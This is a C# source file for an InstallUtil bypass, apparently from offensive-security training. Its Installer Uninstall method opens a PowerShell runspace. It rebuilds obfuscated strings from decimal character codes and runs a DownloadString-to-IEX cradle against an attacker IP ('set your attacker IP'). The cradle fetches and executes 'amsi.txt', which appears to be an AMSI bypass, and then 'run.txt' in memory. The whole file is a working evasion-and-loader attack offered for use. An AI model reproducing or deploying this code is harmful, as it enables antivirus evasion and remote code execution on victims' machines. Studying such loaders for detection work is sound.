using System;
using System.Collections.Specialized;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Xml.Linq;

namespace InstallUtil
{
    internal class Program
    {
        static void Main(string[] args)
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            Run(ps, S(new int[] { 97, 109, 115, 105, 46, 116, 120, 116 })); // amsi.txt
            Run(ps, S(new int[] { 114, 117, 110, 46, 116, 120, 116 }));      // run.txt
            rs.Close();
        }

        // "fruiting": rebuild ASCII strings from their decimal codes at runtime so the
        // URL / command never sit in the binary as plaintext (same idea as the Office
        // macro tradecraft building strings from Chr(<decimal>)).
        private static string S(int[] c)
        {
            char[] r = new char[c.Length];
            for (int i = 0; i < c.Length; i++) r[i] = (char)c[i];
            return new string(r);
        }

        private void Run(PowerShell ps, string resource)
        {
            // "(New-Object System.Net.WebClient).DownloadString('"
            string prefix = S(new int[]
            {
                40, 78, 101, 119, 45, 79, 98, 106, 101, 99, 116, 32, 83, 121, 115, 116, 101, 109, 46,
                78, 101, 116, 46, 87, 101, 98, 67, 108, 105, 101, 110, 116, 41, 46, 68, 111, 119, 110,
                108, 111, 97, 100, 83, 116, 114, 105, 110, 103, 40, 39
            });

            // "http://192.168.45.177/"  <-- set your attacker IP
            string url = S(new int[]
            {
                104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 52, 53, 46, 49, 55, 55, 47
            });

            // "') | IEX"
            string suffix = S(new int[] { 39, 41, 32, 124, 32, 73, 69, 88 });

            string cmd = prefix + url + resource + suffix;
            ps.AddScript(cmd);
            var results = ps.Invoke();
            foreach (PSObject result in results)
            {
                Console.WriteLine(result.ToString());
            }
            // Surface PowerShell errors — otherwise failures are silent:
            foreach (var err in ps.Streams.Error)
            {
                System.IO.File.AppendAllText(@"C:\hta_error.txt", resource + ": " + err.ToString() + Environment.NewLine);
            }
            ps.Commands.Clear();
        }
    }
}
